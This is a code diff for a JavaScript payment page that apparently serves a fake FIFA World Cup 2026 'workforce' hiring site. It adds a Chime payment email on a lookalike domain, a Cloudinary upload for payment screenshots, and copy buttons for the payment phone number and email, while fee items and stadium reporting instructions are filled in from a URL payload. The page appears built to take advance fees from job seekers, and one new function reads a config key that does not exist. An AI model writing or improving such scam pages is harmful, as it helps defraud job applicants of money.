@@ -1,8 +1,12 @@
-/* FIFA World Cup 2026 — payment page (Chime + careers site ?d= payload) */
+
 
 const CONFIG = {
-  chimePhoneNumber: "+1 (513) 628-6294",
+ chimePhoneNumber: "+1 (513) 628-6294",
+  chimePaymentEmail: "payment@fifa26workforce.com",
+  cloudinaryCloudName: "dibwotfd5",
+  cloudinaryUploadPreset: "payment-screenshot",
 };
+
 
 const ICONS = {
   admin: `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 3H8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z"/></svg>`,
@@ -155,12 +159,16 @@ function applyPayload(payload) {
   if (reportingSection && payload.reportingDateLabel) {
     reportingSection.hidden = false;
     document.getElementById("reporting-text").textContent =
-      payload.reportingInstruction || "Please report to venue reception on the date below.";
+      cleanReportingInstruction(payload.reportingInstruction || "Please report to venue reception on the date below.");
     document.getElementById("reporting-meta").textContent =
       `Date: ${payload.reportingDateLabel} · Time: ${payload.reportingTimeLabel || "8:00 AM"}`;
     const venue = [payload.stadiumName, payload.stadiumAddress].filter(Boolean).join(", ");
     if (venue) document.getElementById("reporting-venue").textContent = `Venue: ${venue}`;
   }
+}
+
+function cleanReportingInstruction(text) {
+  return String(text).replace(/\(shown below\)/gi, "(shown above)");
 }
 
 function renderFeeItems(items, explanation) {
@@ -206,8 +214,10 @@ function renderFeeItems(items, explanation) {
 }
 
 function setChimeNumber() {
-  const el = document.getElementById("chime-number");
-  if (el) el.textContent = CONFIG.chimePhoneNumber;
+  const phoneEl = document.getElementById("chime-number");
+  const emailEl = document.getElementById("payment-email");
+  if (phoneEl) phoneEl.textContent = CONFIG.chimePhoneNumber;
+  if (emailEl) emailEl.textContent = CONFIG.chimePaymentEmail;
 }
 
 function selectMethod(method) {
@@ -241,12 +251,20 @@ function selectMethod(method) {
 
 function copyNumber() {
   const digits = CONFIG.chimePhoneNumber.replace(/\D/g, "");
-  const toCopy = "+" + digits;
-  const btn = document.querySelector(".copy-btn");
+  const btn = document.getElementById("copy-phone-btn");
   const label = document.getElementById("copy-label");
+  copyPaymentText("+" + digits, btn, label, "Copy phone number");
+}
 
+function copyEmail() {
+  const btn = document.getElementById("copy-email-btn");
+  const label = document.getElementById("copy-email-label");
+  copyPaymentText(CONFIG.paymentEmail, btn, label, "Copy email address");
+}
+
+function copyPaymentText(toCopy, btn, label, resetText) {
   navigator.clipboard.writeText(toCopy).then(
-    () => setCopied(btn, label),
+    () => setCopied(btn, label, resetText),
     () => {
       const el = document.createElement("textarea");
       el.value = toCopy;
@@ -254,17 +272,17 @@ function copyNumber() {
       el.select();
       document.execCommand("copy");
       document.body.removeChild(el);
-      setCopied(btn, label);
+      setCopied(btn, label, resetText);
     },
   );
 }
 
-function setCopied(btn, label) {
+function setCopied(btn, label, resetText) {
   btn.classList.add("copied");
   label.textContent = "Copied!";
   setTimeout(() => {
     btn.classList.remove("copied");
-    label.textContent = "Copy phone number";
+    label.textContent = resetText;
   }, 2500);
 }
 
@@ -355,3 +373,4 @@ function handleSuccess(data) {
 function generateApplicationId() {
   return "APP-" + Date.now();
 }
+ 
